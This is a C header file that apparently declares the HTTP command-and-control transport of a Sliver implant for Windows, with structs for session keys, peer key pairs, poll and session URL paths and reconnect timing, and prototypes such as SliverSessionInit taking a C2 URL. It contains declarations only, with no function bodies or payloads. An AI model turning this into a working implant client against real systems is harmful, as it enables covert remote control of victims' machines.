#pragma once

#define MINISIGN_SIZE (74)
#define RAW_SIG_SIZE (2 + 8 + ED25519_SIGNATURE_SIZE)

typedef enum _HttpMethod {
	GET,
	POST,
	PUT,
	DEL,
	HEAD,
	OPTIONS,
	TRCE,
	CONNECT,
	MERGE,
	PATCH,
} HttpMethod;

typedef enum _ContentTy
{
	ApplicationAtomXml,
	ApplicationHttp,
	ApplicationJavascript,
	ApplicationJson,
	ApplicationXjson,
	ApplicationOctetstream,
	ApplicationXWwwFormUrlencoded,
	MultipartFormData,
	Boundary,
	FormData,
	ApplicationXjavascript,
	ApplicationXml,
	MessageHttp,
	Text,
	TextJavascript,
	TextJson,
	TextPlain,
	TextPlainUtf16,
	TextPlainUtf16le,
	TextPlainUtf8,
	TextXjavascript,
	TextXjson,
} ContentTy;

typedef enum _HttpHeader
{
	Accept,
	AcceptCharset,
	AcceptEncoding,
	AcceptLanguage,
	AcceptRanges,
	AccessControlAllowOrigin,
	Age,
	Allow,
	Authorization,
	CacheControl,
	Connection,
	ContentEncoding,
	ContentLanguage,
	ContentLength,
	ContentLocation,
	ContentMd5,
	ContentRange,
	ContentType,
	ContentDisposition,
	Date,
	Etag,
	Expect,
	Expires,
	From,
	Host,
	IfMatch,
	IfModifiedSince,
	IfNoneMatch,
	IfRange,
	IfUnmodifiedSince,
	LastModified,
	Location,
	MaxForwards,
	Pragma,
	ProxyAuthenticate,
	ProxyAuthorization,
	Range,
	Referer,
	RetryAfter,
	Server,
	Te,
	Trailer,
	TransferEncoding,
	Upgrade,
	UserAgent,
	Vary,
	Via,
	Warning,
	WwwAuthenticate,
	UpgradeInsecureRequests,
	HeaderEnumEnd
} HttpHeader;

typedef struct _HTTP_REQUEST {
	HttpMethod Method;
	LPSTR lpData;
	DWORD cbData;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	LPSTR Headers[HeaderEnumEnd];
} HTTP_REQUEST, *PHTTP_REQUEST;

typedef struct _HTTP_SESSION {
	HINTERNET hSession;
	BOOL ProxyAutoConfig;
	LPSTR lpProxyAutoConfigUrl;
} HTTP_SESSION, *PHTTP_SESSION;

typedef struct _HTTP_CONFIG {
	PWEB_PROXY pProxyConfig;
	LPSTR lpUserAgent;
	BOOL DisableUpgradeHeader;
	LPSTR lpAccessToken;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	DWORD dwNumberOfAttemps;
	LPSTR AdditionalHeaders[HeaderEnumEnd];
} HTTP_CONFIG, *PHTTP_CONFIG;

typedef struct _HTTP_CLIENT {
	PURI pUri;
	PHTTP_SESSION pHttpSession;
	HINTERNET hConnection;
} HTTP_CLIENT, * PHTTP_CLIENT;

typedef struct _SLIVER_HTTP_CLIENT {
	HTTP_CONFIG HttpConfig;
	PHTTP_CLIENT pHttpClient;
	CHAR szSessionID[33];
	CHAR szSliverName[32];
	CHAR szConfigID[32];
	UINT64 uPeerID;
	PBYTE pSessionKey;
	LPSTR lpRecipientPubKey;
	LPSTR lpPeerPubKey;
	LPSTR lpPeerPrivKey;
	DWORD cbSessionKey;
	LPSTR lpHostName;
	DWORD dwPort;
	BOOL UseStandardPort;
	LPSTR PollPaths[66];
	DWORD cbPollPaths;
	LPSTR PollFiles[109];
	DWORD cbPollFiles;
	LPSTR SessionPaths[99];
	DWORD cbSessionPaths;
	LPSTR SessionFiles[100];
	DWORD cbSessionFiles;
	LPSTR ClosePaths[57];
	DWORD cbClosePaths;
	LPSTR CloseFiles[103];
	DWORD cbCloseFiles;
	LPSTR lpPathPrefix;
	DWORD dwMinNumOfSegments;
	DWORD dwMaxNumOfSegments;
	UINT64 uReconnectInterval;
	UINT64 uEncoderNonce;
	DWORD dwNetTimeout;
	DWORD dwTlsTimeout;
	DWORD dwPollTimeout;
	DWORD dwMaxErrors;
	LPSTR lpServerMinisignPublicKey;
	BOOL IsClosed;
} SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;

typedef enum {
	PollType,
	SessionType,
	CloseType
} SegmentType;

typedef struct _HTTP_RESP {
	PBYTE pRespData;
	DWORD cbResp;
	DWORD dwStatusCode;
	HINTERNET hRequest;
} HTTP_RESP, *PHTTP_RESP;

typedef struct _MINISIGN_PUB_KEY {
	UINT16 SignatureAlgorithm;
	BYTE KeyId[8];
	BYTE PublicKey[32];
} MINISIGN_PUB_KEY, *PMINISIGN_PUB_KEY;

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ PWEB_PROXY pProxyConfig
);

PWINHTTP_PROXY_INFO GetProxyForUrl
(
	_In_ PHTTP_SESSION pHttpSession,
	_In_ PURI pUri
);

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT This,
	_In_ PHTTP_REQUEST pRequest,
	_In_ DWORD dwNumberOfAttemps
);

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
);

BOOL ReceiveData
(
	_In_ HINTERNET hRequest,
	_Out_ PBYTE* pData,
	_Out_ PDWORD pdwDataSize
);

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
);

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
);

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
);

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
);

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ HttpMethod Method,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
);

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
);

PBYTE SliverBase64Decode
(
	_In_ LPSTR lpInput,
	_Out_ PDWORD pcbOutput
);

LPSTR SliverBase64Encode
(
	_In_ PBYTE lpInput,
	_In_ DWORD cbInput
);

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
);

PBYTE SessionDecrypt
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_Out_ PDWORD pcbPlainText
);

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPubKey,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_In_ BOOL IsHashed
);

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ HttpMethod Method,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
);

PSLIVER_HTTP_CLIENT SliverSessionInit
(
	_In_ LPSTR lpC2Url
);

VOID FreeSliverHttpClient
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR StartSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

PSLIVER_HTTP_CLIENT SliverHttpClientInit
(
	_In_ LPSTR lpC2Url
);

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
);